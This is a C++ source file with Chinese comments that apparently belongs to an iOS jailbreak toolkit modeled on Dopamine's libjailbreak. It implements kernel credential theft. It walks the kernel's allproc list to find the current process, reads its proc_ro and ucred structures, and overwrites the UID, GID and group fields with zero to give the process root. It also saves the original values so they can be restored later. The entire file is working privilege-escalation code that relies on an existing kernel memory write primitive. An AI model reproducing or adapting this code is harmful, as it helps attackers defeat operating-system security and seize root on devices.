// KernelUcredStealer.cpp - 内核 ucred 窃取实现
// 基于 libjailbreak (Dopamine) 的 proc_find + ucred patch 逻辑
// 参考: https://github.com/opa334/Dopamine/tree/master/BaseBin/libjailbreak
#include "permissions/KernelUcredStealer.h"
#include <string.h>
#include <stdio.h>
#include <unistd.h>

namespace permissions {

KernelUcredStealer::KernelUcredStealer()
    : orig_uid_(0), orig_ruid_(0), orig_svuid_(0), orig_gid_(0) {
    memset(orig_groups_, 0, sizeof(orig_groups_));
}

KernelUcredStealer::~KernelUcredStealer() {
}

uint64_t KernelUcredStealer::FindCurrentProc(kernel::IKernelMemory* km,
                                              kernel::IOffsetProvider* offsets) {
    if (!km || !offsets) return 0;

    // 方法1: 通过 allproc 全局变量遍历进程链表
    // allproc 地址需要从内核符号表获取 (运行时确定)
    uint64_t allproc = offsets->Allproc();
    if (allproc == 0) {
        // 方法2: 通过 task 端口获取当前进程的 proc
        // 这需要内核 task 端口 (tfp0) 和 task_self
        // 简化实现: 返回 0 表示需要外部传入
        return 0;
    }

    pid_t my_pid = getpid();
    uint64_t proc = allproc;

    // 遍历 allproc 链表
    for (int i = 0; i < 10000 && proc != 0; i++) {
        uint32_t pid = km->Read<uint32_t>(proc + offsets->ProcPid());
        if (pid == my_pid) {
            return proc;
        }
        proc = km->Read<uint64_t>(proc + offsets->ProcListNext());
        if (proc == allproc) break;  // 循环回到起点
    }

    return 0;
}

void KernelUcredStealer::Steal(kernel::IKernelMemory* km,
                                kernel::IOffsetProvider* offsets) {
    if (!km || !offsets) return;

    // 1. 找到当前进程 proc_t
    uint64_t proc = FindCurrentProc(km, offsets);
    if (proc == 0) {
        printf("[-] KernelUcredStealer: cannot find current proc\n");
        return;
    }
    printf("[+] Found current proc at 0x%llx\n", proc);

    // 2. 读取 proc_ro
    uint64_t proc_ro = km->Read<uint64_t>(proc + offsets->ProcProcRO());
    if (proc_ro == 0) {
        printf("[-] Cannot read proc_ro\n");
        return;
    }

    // 3. 读取 ucred
    uint64_t ucred = km->Read<uint64_t>(proc_ro + offsets->ProcROUcred());
    if (ucred == 0) {
        printf("[-] Cannot read ucred\n");
        return;
    }
    printf("[+] ucred at 0x%llx\n", ucred);

    // 4. 备份原始值
    BackupUcred(km, ucred, offsets);

    // 5. 修改 UID/GID 为 0 (root)
    PatchUID(km, ucred, offsets);

    // 6. 修改组列表
    PatchGroups(km, ucred, offsets);

    printf("[+] ucred patched: process now has root privileges\n");
}

void KernelUcredStealer::BackupUcred(kernel::IKernelMemory* km, uint64_t ucred,
                                      kernel::IOffsetProvider* offsets) {
    // 使用 offsets 提供的偏移, 与 PatchUID 保持一致
    orig_uid_ = km->Read<uint32_t>(ucred + offsets->UcredUID());
    orig_ruid_ = km->Read<uint32_t>(ucred + offsets->UcredRUID());
    orig_svuid_ = km->Read<uint32_t>(ucred + offsets->UcredSVUID());
    orig_gid_ = km->Read<uint32_t>(ucred + offsets->UcredGID());

    printf("[+] Backed up ucred: uid=%d ruid=%d svuid=%d gid=%d\n",
           orig_uid_, orig_ruid_, orig_svuid_, orig_gid_);
}

void KernelUcredStealer::RestoreUcred(kernel::IKernelMemory* km, uint64_t ucred,
                                       kernel::IOffsetProvider* offsets) {
    km->Write<uint32_t>(ucred + offsets->UcredUID(), orig_uid_);
    km->Write<uint32_t>(ucred + offsets->UcredRUID(), orig_ruid_);
    km->Write<uint32_t>(ucred + offsets->UcredSVUID(), orig_svuid_);
    km->Write<uint32_t>(ucred + offsets->UcredGID(), orig_gid_);
    printf("[+] ucred restored\n");
}

void KernelUcredStealer::PatchUID(kernel::IKernelMemory* km,
                                   uint64_t ucred,
                                   kernel::IOffsetProvider* offsets) {
    // 写入 cr_uid = 0
    km->Write<uint32_t>(ucred + offsets->UcredUID(), 0);
    // 写入 cr_ruid = 0
    km->Write<uint32_t>(ucred + offsets->UcredRUID(), 0);
    // 写入 cr_svuid = 0
    km->Write<uint32_t>(ucred + offsets->UcredSVUID(), 0);
    // 写入 cr_gid = 0
    km->Write<uint32_t>(ucred + offsets->UcredGID(), 0);

    printf("[+] UID/GID patched to 0\n");
}

void KernelUcredStealer::PatchGroups(kernel::IKernelMemory* km,
                                      uint64_t ucred,
                                      kernel::IOffsetProvider* offsets) {
    // 修改组列表: 第一个组设为 0 (wheel)
    uint32_t groups[16] = {0};
    km->Write(ucred + offsets->UcredGroups(), groups, sizeof(groups));
    printf("[+] Groups patched\n");
}

} // namespace permissions
